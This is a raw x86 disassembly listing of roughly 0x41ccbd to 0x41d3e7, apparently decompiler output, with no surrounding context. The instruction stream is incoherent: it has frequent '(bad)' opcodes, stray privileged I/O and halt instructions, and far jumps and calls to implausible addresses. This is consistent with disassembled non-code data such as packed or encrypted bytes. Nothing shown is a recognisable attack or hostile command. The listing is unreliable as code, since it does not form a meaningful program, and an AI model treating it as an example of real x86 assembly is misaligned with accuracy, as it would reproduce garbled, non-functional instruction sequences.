  41ccbd:	jns    0x41cca8
  41ccbf:	cmp    eax,0x6bbd3a4d
  41ccc4:	pop    es
  41ccc5:	leave  
  41ccc6:	mov    edi,0x4f790a38
  41cccb:	sub    eax,0x6e01e72f
  41ccd0:	lock xlat BYTE PTR ds:[ebx]
  41ccd2:	mov    edx,0xd8011968
  41ccd7:	mov    ds:0x3f8998f7,al
  41ccdc:	push   ss
  41ccdd:	cwde   
  41ccde:	add    al,0x8
  41cce0:	adc    BYTE PTR [ebp-0x22b6f2ed],cl
  41cce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cce7:	aaa    
  41cce8:	sub    bh,BYTE PTR [edx+0x60]
  41cceb:	adc    esp,edi
  41cced:	jle    0x41ccd3
  41ccef:	xor    eax,0x8345d267
  41ccf4:	push   0xffffffe9
  41ccf6:	outs   dx,DWORD PTR ds:[esi]
  41ccf7:	lods   al,BYTE PTR ds:[esi]
  41ccf8:	xlat   BYTE PTR ds:[ebx]
  41ccf9:	out    dx,eax
  41ccfa:	jmp    0xc2749554
  41ccff:	mov    bl,0x1e
  41cd01:	int3   
  41cd02:	xor    BYTE PTR [ebx+0x6d],al
  41cd05:	jg     0x41cccb
  41cd07:	lahf   
  41cd08:	inc    edi
  41cd09:	cmc    
  41cd0a:	lds    edx,FWORD PTR [ebx-0x44]
  41cd0d:	xchg   edx,eax
  41cd0e:	or     esp,0xfb161f18
  41cd14:	and    esi,edx
  41cd16:	dec    ebx
  41cd17:	adc    BYTE PTR ds:0xf29fff5a,bh
  41cd1d:	ja     0x41cd21
  41cd1f:	(bad)  
  41cd20:	enter  0x27c4,0x3b
  41cd24:	cld    
  41cd25:	adc    ebx,DWORD PTR [edx]
  41cd27:	xchg   DWORD PTR [ebx],esp
  41cd29:	push   0x4d
  41cd2b:	fs ja  0x41ccc1
  41cd2e:	push   ds
  41cd2f:	xor    eax,0x7e9c910a
  41cd34:	lea    ecx,[ecx-0x39cc279a]
  41cd3a:	and    DWORD PTR [ebx+0x3fa91650],0xa4d7e21a
  41cd44:	sbb    DWORD PTR [ecx+eiz*2-0x40],ecx
  41cd48:	push   ebx
  41cd49:	dec    ebx
  41cd4a:	jl     0x41cd56
  41cd4c:	rcr    ebp,cl
  41cd4e:	sub    cl,BYTE PTR [ecx+0x29ea07fe]
  41cd54:	mov    bl,0xc2
  41cd56:	test   eax,0xbfe49fb0
  41cd5b:	mov    BYTE PTR [edx+0x45],ch
  41cd5e:	pop    ss
  41cd5f:	idiv   DWORD PTR [edi-0x4c]
  41cd62:	pushf  
  41cd63:	js     0x41cdc0
  41cd65:	inc    ecx
  41cd66:	inc    ebx
  41cd67:	dec    ebx
  41cd68:	int    0xff
  41cd6a:	leave  
  41cd6b:	dec    eax
  41cd6c:	or     al,0x6c
  41cd6e:	dec    ebx
  41cd6f:	sahf   
  41cd70:	jno    0x41cd42
  41cd72:	cld    
  41cd73:	xlat   BYTE PTR ds:[ebx]
  41cd74:	call   0xe896:0xcf69a23
  41cd7b:	pop    eax
  41cd7c:	neg    BYTE PTR [edx+0x76]
  41cd7f:	ror    BYTE PTR [ecx-0x1484bf89],1
  41cd85:	fnsave [ebx-0x2e]
  41cd88:	imul   ecx,DWORD PTR [esi-0x4d],0xffffffdf
  41cd8c:	clc    
  41cd8d:	mov    DWORD PTR [eax+0x1bfb9a31],esi
  41cd93:	cwde   
  41cd94:	push   ebp
  41cd95:	fcom   QWORD PTR [esi-0x2b]
  41cd98:	(bad)  
  41cd99:	sbb    ebp,DWORD PTR [edx]
  41cd9b:	jb     0x41cdaf
  41cd9d:	int3   
  41cd9e:	pop    esi
  41cd9f:	or     bh,BYTE PTR [edx-0x12]
  41cda2:	rol    BYTE PTR gs:[ecx+edi*8],0x8e
  41cda7:	mov    dl,0x68
  41cda9:	popa   
  41cdaa:	test   BYTE PTR [ebx-0x6a],ah
  41cdad:	dec    ebp
  41cdae:	add    ah,bl
  41cdb0:	mov    cl,0x9e
  41cdb2:	and    BYTE PTR [ebx+0x79d29f2c],bh
  41cdb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdb9:	push   ss
  41cdba:	mov    ebx,eax
  41cdbc:	xchg   ebp,eax
  41cdbd:	sub    ah,BYTE PTR [edx+0x1f5495ab]
  41cdc3:	jg     0x41cda7
  41cdc5:	repnz mov eax,0x9767c542
  41cdcb:	cmp    DWORD PTR [edx],ebx
  41cdcd:	stos   DWORD PTR es:[edi],eax
  41cdce:	inc    ecx
  41cdcf:	or     ebp,DWORD PTR ds:0x5141643c
  41cdd5:	sbb    BYTE PTR [ebx-0x48],al
  41cdd8:	mov    ch,0x4e
  41cdda:	mov    ebp,0x6b496b33
  41cddf:	jns    0x41cd72
  41cde1:	mov    eax,ds:0xd0ce7ade
  41cde6:	(bad)  
  41cde7:	adc    al,0x1
  41cde9:	inc    ecx
  41cdea:	mul    BYTE PTR [edi]
  41cdec:	add    eax,0xe87c283d
  41cdf1:	out    0x88,al
  41cdf3:	push   0xda932a63
  41cdf8:	leave  
  41cdf9:	dec    esi
  41cdfa:	pop    ss
  41cdfb:	test   BYTE PTR [edi+esi*2],bh
  41cdfe:	pop    ebp
  41cdff:	test   ah,ch
  41ce01:	dec    eax
  41ce02:	inc    ebp
  41ce03:	loope  0x41cdcb
  41ce05:	mov    al,0xf8
  41ce07:	add    BYTE PTR fs:[edi+0x3e],0xa0
  41ce0c:	mov    dh,0x8b
  41ce0e:	stos   DWORD PTR es:[edi],eax
  41ce0f:	dec    edi
  41ce10:	pop    esi
  41ce11:	mov    ds:0xf394fa82,al
  41ce16:	addr16 jbe 0x41cdcd
  41ce19:	das    
  41ce1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce1b:	mov    ah,0x9e
  41ce1d:	ror    edi,1
  41ce1f:	stos   BYTE PTR es:[edi],al
  41ce20:	cmp    eax,0xc5675dd1
  41ce25:	(bad)  
  41ce26:	(bad)  
  41ce27:	jmp    0x115eb3ad
  41ce2c:	jno    0x41cdbd
  41ce2e:	push   ds
  41ce2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce30:	hlt    
  41ce31:	mov    ebx,0xa2849c18
  41ce36:	jnp    0x41cde3
  41ce38:	mov    esp,0x56fc4c59
  41ce3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce3e:	push   esi
  41ce3f:	in     eax,dx
  41ce40:	or     al,0x3
  41ce42:	cwde   
  41ce43:	fsqrt  
  41ce45:	retf   
  41ce46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce47:	popa   
  41ce48:	(bad)  
  41ce49:	retf   0x9187
  41ce4c:	cwde   
  41ce4d:	xchg   esi,eax
  41ce4e:	aad    0xf2
  41ce50:	pop    es
  41ce51:	sahf   
  41ce52:	into   
  41ce53:	dec    esi
  41ce54:	lock sub DWORD PTR [esi],ebp
  41ce57:	jae    0x41ceb1
  41ce59:	outs   dx,DWORD PTR ds:[esi]
  41ce5a:	jle    0x41ce48
  41ce5c:	test   dh,bl
  41ce5e:	xlat   BYTE PTR ds:[ebx]
  41ce5f:	(bad)  
  41ce60:	or     eax,0x7dc0a338
  41ce65:	les    esi,FWORD PTR [esi]
  41ce67:	sbb    DWORD PTR [ebp+0x4cc71fc4],edi
  41ce6d:	ror    DWORD PTR [eax],cl
  41ce6f:	mov    edi,0xdfd65c72
  41ce74:	(bad)  
  41ce76:	jg     0x41cee5
  41ce78:	pop    esi
  41ce79:	xor    ebp,DWORD PTR [ebx-0xd2db107]
  41ce7f:	push   esi
  41ce80:	or     DWORD PTR [edi-0xef42c2c],0x80223ff0
  41ce8a:	sbb    BYTE PTR [ebx-0x77b9ea5e],ch
  41ce90:	repnz cs adc al,0x9a
  41ce94:	pushf  
  41ce95:	adc    eax,DWORD PTR [ecx-0x1a41ff]
  41ce9b:	ja     0x41cefa
  41ce9d:	mov    ah,0xeb
  41ce9f:	hlt    
  41cea0:	push   ecx
  41cea1:	inc    esi
  41cea2:	fisubr DWORD PTR cs:0x46b6aa59
  41cea9:	xchg   esi,eax
  41ceaa:	jb     0x41ce35
  41ceac:	mov    al,es:0x5b72eb06
  41ceb2:	dec    ecx
  41ceb3:	push   ss
  41ceb4:	jmp    0xee98:0xda0fd393
  41cebb:	pop    ecx
  41cebc:	and    bl,bh
  41cebe:	xor    al,BYTE PTR [ebx]
  41cec0:	dec    ecx
  41cec1:	pop    es
  41cec2:	call   0x7b94:0x21b5bc55
  41cec9:	cs xchg ecx,eax
  41cecb:	sbb    DWORD PTR [esi-0x1c],0x30
  41cecf:	(bad)  
  41ced0:	jl     0x41cf14
  41ced2:	out    dx,al
  41ced3:	sbb    esi,DWORD PTR gs:[eax+0x6f]
  41ced7:	aas    
  41ced8:	test   al,0x48
  41ceda:	mov    cl,0xe7
  41cedc:	shl    BYTE PTR [edi+edi*8],0xda
  41cee0:	js     0x41cf03
  41cee2:	test   BYTE PTR [eax-0x35b15ba8],0x51
  41cee9:	or     ecx,DWORD PTR [edi-0xd6b0d25]
  41ceef:	cmp    BYTE PTR [ecx],dh
  41cef1:	arpl   WORD PTR [ebx-0x4142425e],cx
  41cef7:	adc    ah,BYTE PTR [ecx]
  41cef9:	je     0x41cf46
  41cefb:	inc    edi
  41cefc:	sahf   
  41cefd:	xor    edx,ecx
  41ceff:	repnz jmp FWORD PTR [edi-0x7d45b7ba]
  41cf06:	scas   al,BYTE PTR es:[edi]
  41cf07:	retf   
  41cf08:	in     eax,dx
  41cf09:	mov    edi,0x44be042f
  41cf0e:	sbb    al,0xf9
  41cf10:	sahf   
  41cf11:	sahf   
  41cf12:	or     al,0x1b
  41cf14:	adc    BYTE PTR [esp+ebx*1],bh
  41cf17:	cwde   
  41cf18:	xor    BYTE PTR [edi-0x38],ch
  41cf1b:	xor    al,0x89
  41cf1d:	lahf   
  41cf1e:	addr16 xchg ebp,eax
  41cf20:	push   0xb
  41cf22:	mov    gs,WORD PTR [ebx+ecx*1-0x6eb1fa84]
  41cf29:	aaa    
  41cf2a:	xchg   edx,eax
  41cf2b:	outs   dx,BYTE PTR ds:[esi]
  41cf2c:	aaa    
  41cf2d:	mov    dh,BYTE PTR [ebx-0x423476a8]
  41cf33:	xchg   edi,edx
  41cf35:	pop    edx
  41cf36:	sbb    DWORD PTR [ebp-0x5f],ebx
  41cf39:	pop    ss
  41cf3a:	ins    BYTE PTR es:[edi],dx
  41cf3b:	ja     0x41cf15
  41cf3d:	mov    eax,ds:0xaa48f3e9
  41cf42:	int    0x20
  41cf44:	mov    ds,eax
  41cf46:	push   ebx
  41cf47:	mov    WORD PTR ds:0x6171b823,ds
  41cf4d:	fild   DWORD PTR [esi-0x32]
  41cf50:	pushf  
  41cf51:	mul    BYTE PTR [ebx-0x6b]
  41cf54:	add    dh,BYTE PTR [esi]
  41cf56:	mov    ebx,0x5a82d0dd
  41cf5b:	int3   
  41cf5c:	scas   al,BYTE PTR es:[edi]
  41cf5d:	cwde   
  41cf5e:	jo     0x41cf63
  41cf60:	pop    ecx
  41cf61:	lock sahf 
  41cf63:	xchg   ecx,eax
  41cf64:	cmp    al,0x79
  41cf66:	pop    eax
  41cf67:	sub    DWORD PTR [eax],ecx
  41cf69:	sub    bh,BYTE PTR [ecx-0x7e0243ed]
  41cf6f:	(bad)  
  41cf70:	dec    ebp
  41cf71:	(bad)  [ecx]
  41cf73:	ins    BYTE PTR es:[edi],dx
  41cf74:	les    esi,FWORD PTR [edi]
  41cf76:	aaa    
  41cf77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf78:	xchg   ebx,eax
  41cf79:	ds push edi
  41cf7b:	inc    eax
  41cf7c:	out    dx,eax
  41cf7d:	into   
  41cf7e:	scas   eax,DWORD PTR es:[edi]
  41cf7f:	add    DWORD PTR [ebx+0x7c3d1c2a],eax
  41cf85:	imul   ebp,esp,0x175dced4
  41cf8b:	dec    ecx
  41cf8c:	fdivr  QWORD PTR [edx+eiz*8+0x534acd63]
  41cf93:	adc    al,0x22
  41cf95:	ja     0x41cf85
  41cf97:	sbb    DWORD PTR cs:[edi+0x1],0xd13fcb77
  41cf9f:	mov    eax,0xbf50c58e
  41cfa4:	inc    ecx
  41cfa5:	enter  0x90b,0xea
  41cfa9:	retf   0x10c8
  41cfac:	call   0x41cfb1
  41cfb1:	add    BYTE PTR [ebx-0x37],bh
  41cfb4:	xor    bh,0xb2
  41cfb7:	(bad)  
  41cfb8:	jg     0x41cf87
  41cfba:	sbb    DWORD PTR [esp+esi*1-0x5b],0x795886fd
  41cfc2:	inc    ecx
  41cfc3:	dec    ebx
  41cfc4:	add    DWORD PTR [eax],eax
  41cfc6:	repz add al,0x0
  41cfc9:	add    BYTE PTR [ecx-0x1e],bl
  41cfcc:	adc    eax,0x8ba35586
  41cfd1:	rcr    DWORD PTR [esi+0x231fe0ec],1
  41cfd7:	push   cs
  41cfd8:	pop    ecx
  41cfd9:	pop    ss
  41cfda:	dec    esi
  41cfdb:	fnsave [eax-0x17ecfdb2]
  41cfe1:	out    dx,eax
  41cfe2:	jae    0x41d058
  41cfe4:	jle    0x41cfd6
  41cfe6:	push   0xe
  41cfe8:	add    DWORD PTR [eax],eax
  41cfea:	arpl   WORD PTR [ecx-0x5a],si
  41cfed:	sub    ah,ah
  41cfef:	enter  0x3c52,0xd5
  41cff3:	jge    0x41cfbf
  41cff5:	push   edi
  41cff6:	dec    ebp
  41cff7:	(bad)  
  41cff8:	pop    ebx
  41cff9:	push   ecx
  41cffa:	jae    0x41d06e
  41cffc:	xchg   esi,eax
  41cffd:	imul   DWORD PTR [ebx+ebx*2-0x2a]
  41d001:	ins    BYTE PTR es:[edi],dx
  41d002:	fsub   QWORD PTR [ecx]
  41d004:	dec    ecx
  41d005:	mov    ds:0x320f8fce,eax
  41d00a:	sbb    DWORD PTR [ecx+0x7f],ebx
  41d00d:	add    esp,esp
  41d00f:	lods   eax,DWORD PTR ds:[esi]
  41d010:	lea    eax,[edx+0x2d]
  41d013:	push   edi
  41d014:	js     0x41cfb2
  41d016:	inc    DWORD PTR [ebx]
  41d018:	jno    0x41d060
  41d01a:	shr    dh,0x4b
  41d01d:	push   ss
  41d01e:	shr    BYTE PTR [edx-0x4f],cl
  41d021:	push   ss
  41d022:	sbb    al,0x30
  41d024:	mov    eax,0x37625bce
  41d029:	push   esp
  41d02a:	and    BYTE PTR [edi+0x72a823e7],ah
  41d030:	loope  0x41d014
  41d032:	push   0x7
  41d034:	imul   esp,eax,0x3f
  41d037:	repnz retf 0xdc97
  41d03b:	clc    
  41d03c:	jns    0x41d01f
  41d03e:	aad    0x20
  41d040:	shl    ecx,0xa9
  41d043:	int    0xc8
  41d045:	retf   0xa771
  41d048:	push   cs
  41d049:	pop    ebp
  41d04a:	ror    BYTE PTR [ecx],cl
  41d04c:	and    DWORD PTR ds:[ebx+0x4096c909],esi
  41d053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d054:	xor    al,al
  41d056:	inc    esp
  41d057:	loope  0x41d001
  41d059:	sbb    DWORD PTR [esi],0xc43a2853
  41d05f:	ds inc eax
  41d061:	cli    
  41d062:	pop    edi
  41d063:	mov    ah,0x77
  41d065:	add    DWORD PTR [ebp-0x4b],edi
  41d068:	stc    
  41d069:	scas   eax,DWORD PTR es:[edi]
  41d06a:	bts    ecx,0x90
  41d06e:	add    eax,0x6cdd1709
  41d073:	lods   eax,DWORD PTR ds:[esi]
  41d074:	iret   
  41d075:	(bad)  
  41d076:	pop    esp
  41d077:	jno    0x41d0a7
  41d079:	addr16 dec ecx
  41d07b:	out    0xd5,eax
  41d07d:	imul   ebx,eax,0x9fdb1588
  41d083:	scas   eax,DWORD PTR es:[edi]
  41d084:	out    dx,al
  41d085:	lds    esi,FWORD PTR [ebp-0x58ad3c17]
  41d08b:	test   DWORD PTR [eiz*2-0x3902f423],edx
  41d092:	sbb    eax,0xf59821de
  41d097:	test   DWORD PTR [esi-0x57d4051],0x8efdc217
  41d0a1:	fisubr WORD PTR [edi+0x67]
  41d0a4:	mov    gs,edi
  41d0a6:	adc    ah,dl
  41d0a8:	sub    al,BYTE PTR [ebp-0x3f]
  41d0ab:	dec    edi
  41d0ac:	stos   BYTE PTR es:[edi],al
  41d0ad:	and    DWORD PTR [eax+esi*8+0xe],edi
  41d0b1:	inc    ebx
  41d0b2:	mov    DWORD PTR cs:[ebp+0x49],edx
  41d0b6:	dec    ecx
  41d0b7:	sub    edx,DWORD PTR [ecx-0x516123d7]
  41d0bd:	imul   eax,DWORD PTR [edi-0x6e],0x2f
  41d0c1:	inc    ebp
  41d0c2:	or     al,0xfd
  41d0c4:	fadd   QWORD PTR [ebx]
  41d0c6:	leave  
  41d0c7:	or     al,0xef
  41d0c9:	mov    bh,0xed
  41d0cb:	xlat   BYTE PTR ds:[ebx]
  41d0cc:	out    dx,al
  41d0cd:	push   ds
  41d0ce:	xchg   DWORD PTR [esi],esp
  41d0d0:	mov    esp,DWORD PTR [ebp-0x67]
  41d0d3:	mov    ds:0x1d6872c,al
  41d0d8:	aas    
  41d0d9:	jecxz  0x41d05d
  41d0db:	xor    al,0xf2
  41d0dd:	adc    eax,0xc5cbb203
  41d0e2:	push   ss
  41d0e3:	mov    edi,DWORD PTR [ebp-0x38]
  41d0e6:	mov    dh,0x3d
  41d0e8:	push   ebx
  41d0e9:	popa   
  41d0ea:	sbb    dl,al
  41d0ec:	lock xchg esp,eax
  41d0ee:	ins    BYTE PTR es:[edi],dx
  41d0ef:	pop    ecx
  41d0f0:	repnz or bl,BYTE PTR [eax+eax*2-0x482e6e9e]
  41d0f8:	mov    eax,ds:0xa1758c
  41d0fd:	adc    bh,bh
  41d0ff:	fmulp  st(5),st
  41d101:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d102:	jne    0x41d118
  41d104:	(bad)  [edx-0x1d]
  41d107:	pop    esp
  41d108:	cmp    esi,DWORD PTR [ebp-0x26]
  41d10b:	retf   0xa72c
  41d10e:	mov    esi,ebp
  41d110:	icebp  
  41d111:	mov    DWORD PTR ds:0xc0171b47,edi
  41d117:	pop    ebp
  41d118:	push   esi
  41d119:	and    cl,BYTE PTR [ebp-0x24]
  41d11c:	data16 clc 
  41d11e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d11f:	push   ds
  41d120:	and    al,0x5b
  41d122:	test   DWORD PTR [edi],ecx
  41d124:	data16 jne 0x41d173
  41d127:	(bad)  
  41d128:	mov    ebp,?
  41d12a:	or     BYTE PTR [edx+0x1d],ah
  41d12d:	add    BYTE PTR [esi+ebp*1-0x425a5cc6],bl
  41d134:	xor    esp,DWORD PTR [esi]
  41d136:	sub    bh,dl
  41d138:	(bad)  
  41d13a:	shl    BYTE PTR [eax],0x35
  41d13d:	dec    ecx
  41d13e:	pop    edi
  41d13f:	xchg   ebp,eax
  41d140:	mov    ebp,0x42e9df69
  41d145:	psubw  mm3,mm5
  41d148:	scas   eax,DWORD PTR es:[edi]
  41d149:	and    eax,0x569d150e
  41d14e:	mov    WORD PTR [ecx],ss
  41d150:	and    ah,BYTE PTR [edi-0x409b5a4f]
  41d156:	call   0xc952:0x331c97dd
  41d15d:	sbb    DWORD PTR [ebp-0x606afbcf],edx
  41d163:	(bad)  
  41d165:	out    0x26,eax
  41d167:	popa   
  41d168:	dec    ecx
  41d169:	or     al,0x6e
  41d16b:	pop    ebp
  41d16c:	mul    BYTE PTR [edi+0x6e863802]
  41d172:	cmp    BYTE PTR [eax-0x4c7bf254],ah
  41d178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d179:	pop    eax
  41d17a:	fsub   DWORD PTR [ecx+0x4774ec0f]
  41d180:	scas   eax,DWORD PTR es:[edi]
  41d181:	rcl    DWORD PTR [edi],0x4e
  41d184:	lock cwde 
  41d186:	daa    
  41d187:	push   ecx
  41d188:	pusha  
  41d189:	jno    0x41d195
  41d18b:	lods   al,BYTE PTR ds:[esi]
  41d18c:	ds xchg ebp,eax
  41d18e:	dec    ebx
  41d18f:	dec    ecx
  41d190:	inc    ecx
  41d191:	iret   
  41d192:	add    BYTE PTR [ebp+0x7ee7873b],cl
  41d198:	jb     0x41d1ee
  41d19a:	loope  0x41d183
  41d19c:	lods   eax,DWORD PTR ds:[esi]
  41d19d:	xchg   DWORD PTR [ecx],edx
  41d19f:	(bad)  
  41d1a1:	push   ebx
  41d1a2:	cli    
  41d1a3:	jp     0x41d197
  41d1a5:	sar    ebx,1
  41d1a7:	xchg   ecx,eax
  41d1a8:	popa   
  41d1a9:	in     eax,dx
  41d1aa:	sbb    dh,bh
  41d1ac:	mov    edi,0x1192c171
  41d1b1:	xlat   BYTE PTR ds:[ebx]
  41d1b2:	sub    eax,0xe033ade1
  41d1b7:	cmp    edi,esp
  41d1b9:	(bad)  
  41d1ba:	test   al,0xa0
  41d1bc:	aad    0x87
  41d1be:	sbb    BYTE PTR [eax],al
  41d1c0:	inc    ecx
  41d1c1:	xor    esi,DWORD PTR [ebx]
  41d1c3:	les    esp,FWORD PTR [edx+ecx*1-0x28]
  41d1c7:	xchg   ebx,eax
  41d1c8:	cwde   
  41d1c9:	rcl    BYTE PTR [ecx],1
  41d1cb:	fmul   DWORD PTR [edi-0x32387017]
  41d1d1:	and    BYTE PTR [ecx-0x2f6e943d],dh
  41d1d7:	aad    0xb3
  41d1d9:	retf   0x203
  41d1dc:	fiadd  DWORD PTR [ebp+0x1dfc53b3]
  41d1e2:	jecxz  0x41d186
  41d1e4:	jae    0x41d1c0
  41d1e6:	jecxz  0x41d215
  41d1e8:	mov    BYTE PTR ds:0x4e25153e,ch
  41d1ee:	mov    dl,0xf
  41d1f0:	sbb    BYTE PTR [ecx+0x5c328ece],ch
  41d1f6:	leave  
  41d1f7:	inc    ebx
  41d1f8:	xor    al,0x6d
  41d1fa:	mov    edx,0x41840512
  41d1ff:	jecxz  0x41d251
  41d201:	xchg   ecx,eax
  41d202:	xchg   ebx,eax
  41d203:	inc    ebp
  41d204:	in     al,0xd8
  41d206:	das    
  41d207:	mov    ah,0x58
  41d209:	lods   al,BYTE PTR ds:[esi]
  41d20a:	sub    al,0x1
  41d20c:	jbe    0x41d1f9
  41d20e:	xlat   BYTE PTR ds:[ebx]
  41d20f:	out    dx,eax
  41d210:	fldcw  WORD PTR [ebx]
  41d212:	ds and bh,cl
  41d215:	iret   
  41d216:	in     al,0x3e
  41d218:	js     0x41d21f
  41d21a:	(bad)  [esi-0x10]
  41d21d:	loop   0x41d1f5
  41d21f:	sub    al,al
  41d221:	aas    
  41d222:	icebp  
  41d223:	jae    0x41d240
  41d225:	mov    eax,ds:0x715502b5
  41d22a:	out    dx,eax
  41d22b:	fistp  DWORD PTR [edx-0x75]
  41d22e:	mov    eax,0x19d22acd
  41d233:	rcl    BYTE PTR [ebx-0x50588489],cl
  41d239:	jl     0x41d29f
  41d23b:	xchg   edx,eax
  41d23c:	cmp    eax,0xb8bb9e6
  41d241:	xor    BYTE PTR [edx+eiz*8-0x3],bl
  41d245:	(bad)  
  41d246:	cmp    eax,0x3a6efc0
  41d24b:	or     ecx,edi
  41d24d:	push   esp
  41d24e:	inc    ecx
  41d24f:	mov    bh,0x19
  41d251:	fs mov ?,eax
  41d254:	cmp    dh,0xa8
  41d257:	cmp    bh,BYTE PTR [esi]
  41d259:	xor    bl,ch
  41d25b:	sub    DWORD PTR [esi-0x19],edx
  41d25e:	jmp    0x41d1ff
  41d260:	push   cs
  41d261:	add    ebx,edi
  41d263:	imul   esi,DWORD PTR [esi],0x6a43d87d
  41d269:	push   0x843703dd
  41d26e:	ja     0x41d293
  41d270:	pop    ebx
  41d271:	in     eax,0x7c
  41d273:	and    eax,0x4a55c64b
  41d278:	stos   BYTE PTR es:[edi],al
  41d279:	sub    DWORD PTR [edx+0x61],esp
  41d27c:	loope  0x41d2b8
  41d27e:	or     cl,ch
  41d280:	mov    ds:0xadae2d90,eax
  41d285:	sbb    eax,DWORD PTR [ecx-0x6d]
  41d288:	retf   
  41d289:	in     eax,0x14
  41d28b:	(bad)  
  41d28c:	cmc    
  41d28d:	outs   dx,BYTE PTR ds:[esi]
  41d28e:	stos   BYTE PTR es:[edi],al
  41d28f:	in     eax,dx
  41d290:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d292:	sbb    eax,DWORD PTR [edi]
  41d294:	lock mov esi,0x7a94f194
  41d29a:	pop    esp
  41d29b:	and    cl,BYTE PTR [eax-0x74]
  41d29e:	dec    ebx
  41d29f:	sub    DWORD PTR [ecx-0x1c358e95],eax
  41d2a5:	jg     0x41d2cf
  41d2a7:	(bad)  
  41d2a9:	sub    eax,edx
  41d2ab:	pop    esp
  41d2ac:	leave  
  41d2ad:	inc    ebp
  41d2ae:	loope  0x41d30d
  41d2b0:	test   BYTE PTR [esp+edx*4-0x14],0x57
  41d2b5:	pop    esp
  41d2b6:	sub    ch,BYTE PTR ds:0x2cca3094
  41d2bc:	sti    
  41d2bd:	retf   0xc81
  41d2c0:	jne    0x41d30e
  41d2c2:	sub    ch,cl
  41d2c4:	dec    ecx
  41d2c5:	dec    edx
  41d2c6:	sub    eax,0xd962684
  41d2cb:	pop    ds
  41d2cc:	fisubr WORD PTR [eax+ebp*4]
  41d2cf:	add    eax,0xc4c1809f
  41d2d4:	push   es
  41d2d5:	lds    ebx,FWORD PTR [eax]
  41d2d7:	xchg   ebx,eax
  41d2d8:	push   esp
  41d2d9:	addr16 dec ebx
  41d2db:	inc    ebx
  41d2dc:	lods   eax,DWORD PTR ds:[esi]
  41d2dd:	imul   esi,DWORD PTR [ebx-0x21dd1f21],0x88b4b7ba
  41d2e7:	xchg   BYTE PTR ds:0xa3ad9db7,ch
  41d2ed:	sbb    bp,ax
  41d2f0:	in     al,0xa1
  41d2f2:	adc    BYTE PTR [ecx-0x4bcb2931],0x29
  41d2f9:	mov    ds:0x53f69bd3,al
  41d2fe:	bound  edi,QWORD PTR [ecx+0x4ebf256d]
  41d304:	cmp    dl,BYTE PTR ds:0x7162f314
  41d30a:	sub    ecx,DWORD PTR [si-0x57]
  41d30e:	mov    ecx,0x8ab60dee
  41d313:	cdq    
  41d314:	inc    ebp
  41d315:	xchg   DWORD PTR [edx],eax
  41d317:	jns    0x41d328
  41d319:	sahf   
  41d31a:	shl    DWORD PTR [ecx-0x26429fb7],1
  41d320:	sbb    ch,ch
  41d322:	rol    edx,cl
  41d324:	push   edx
  41d325:	mov    al,ds:0x1b52b431
  41d32a:	inc    esp
  41d32b:	retf   
  41d32c:	xor    eax,0x9e23bc2a
  41d331:	mov    cl,0xa4
  41d333:	cmp    edx,DWORD PTR [ebx+ebp*1+0xf]
  41d337:	scas   eax,DWORD PTR es:[edi]
  41d338:	ins    BYTE PTR es:[edi],dx
  41d339:	inc    ecx
  41d33a:	scas   eax,DWORD PTR es:[edi]
  41d33b:	rcl    DWORD PTR [ebx+ebp*1-0x5105235a],0xdb
  41d343:	stc    
  41d344:	sbb    al,0x53
  41d346:	test   BYTE PTR [esi-0x5a87a968],ch
  41d34c:	adc    al,0x29
  41d34e:	dec    esp
  41d34f:	mov    bh,0x5f
  41d351:	dec    ecx
  41d352:	int    0xa3
  41d354:	mov    edi,ecx
  41d356:	retf   0x5cbc
  41d359:	js     0x41d384
  41d35b:	not    edx
  41d35d:	sub    ecx,DWORD PTR [edi]
  41d35f:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41d361:	push   edi
  41d362:	mul    BYTE PTR [esi]
  41d364:	mov    dh,0x14
  41d366:	push   esi
  41d367:	jmp    0x40c25cf4
  41d36c:	scas   eax,DWORD PTR es:[edi]
  41d36d:	outs   dx,BYTE PTR ds:[esi]
  41d36e:	xchg   DWORD PTR ds:[eax],esp
  41d371:	xchg   edi,eax
  41d372:	sahf   
  41d373:	imul   esp,esi,0xca4630c2
  41d379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d37a:	cmp    al,0xf8
  41d37c:	pop    ebp
  41d37d:	add    BYTE PTR [ebp-0x5b974e17],bh
  41d383:	mov    eax,ds:0x59d9201d
  41d388:	loopne 0x41d3b5
  41d38a:	inc    eax
  41d38b:	(bad)  
  41d38c:	test   BYTE PTR [ecx+0x12],0x63
  41d390:	into   
  41d391:	push   esi
  41d392:	push   0xffffffc7
  41d394:	stos   DWORD PTR es:[edi],eax
  41d395:	mov    cl,0xe5
  41d397:	xchg   esp,eax
  41d398:	ror    BYTE PTR [ecx-0x4c],0x53
  41d39c:	push   0x745febd7
  41d3a1:	and    al,0xf5
  41d3a3:	xchg   edi,eax
  41d3a4:	fld    TBYTE PTR [esi+eiz*2-0x5cbfe6fe]
  41d3ab:	inc    ebx
  41d3ac:	dec    DWORD PTR [esi+ebp*2-0x66]
  41d3b0:	mov    eax,ds:0xcdb1eb52
  41d3b5:	mov    al,0x66
  41d3b7:	fwait
  41d3b8:	jne    0x41d3e9
  41d3ba:	xchg   DWORD PTR [edx-0x3fe354dc],ebp
  41d3c0:	mov    dh,0x7d
  41d3c2:	sahf   
  41d3c3:	fld    DWORD PTR [ebx]
  41d3c5:	jle    0x41d43b
  41d3c7:	repnz mov ds:0x655268db,eax
  41d3cd:	mov    edx,0x563646fd
  41d3d2:	retf   
  41d3d3:	inc    esp
  41d3d4:	inc    eax
  41d3d5:	xlat   BYTE PTR ds:[ebx]
  41d3d6:	cld    
  41d3d7:	sub    DWORD PTR [edx+0x34],0x178b6ad9
  41d3de:	es (bad) 
  41d3e0:	not    BYTE PTR [ecx]
  41d3e2:	push   ss
  41d3e3:	push   eax
  41d3e4:	cmp    BYTE PTR [eax+eax*1],ch
  41d3e7:	daa    
